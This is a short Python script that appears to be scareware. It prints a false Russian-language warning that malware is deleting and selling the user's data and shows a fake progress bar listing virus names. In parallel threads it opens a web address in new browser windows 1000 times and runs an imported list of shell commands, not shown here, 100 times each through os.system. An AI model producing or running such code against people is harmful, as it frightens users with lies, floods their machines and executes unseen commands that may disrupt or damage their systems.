import time
import os
import webbrowser
import threading
from list_virus import list_virus
from list_command import list_command

import progressbar


def removal_process():
    print("ЗАПУСК ВРЕДОНОСНЫХ ПРОГРАМм ДЛЯ УДАЛЕНИЯ И ПРОДаЖИ ВАШИХ ДАННЫХ")
    time.sleep(1)

    bar = progressbar.ProgressBar(maxval=66)
    for index in range(len(list_virus)):
        time.sleep(0.03)
        try:
            print(list_virus[index])
        except IndexError:
            pass
        bar.update(index)
    else:
        for count in range(1000): # сколько раз открыть браузер
            webbrowser.open("wwwww.jodi.org", new=2, autoraise=True)


def open_windows():
    for count in range(100): # !!! range(100)
        for index in range(len(list_command)):
            os.system(list_command[index])


if __name__ == '__main__':
    thread1 = threading.Thread(target=removal_process)
    thread2 = threading.Thread(target=open_windows)

    thread1.start()
    thread2.start()

    thread1.join()
    thread2.join()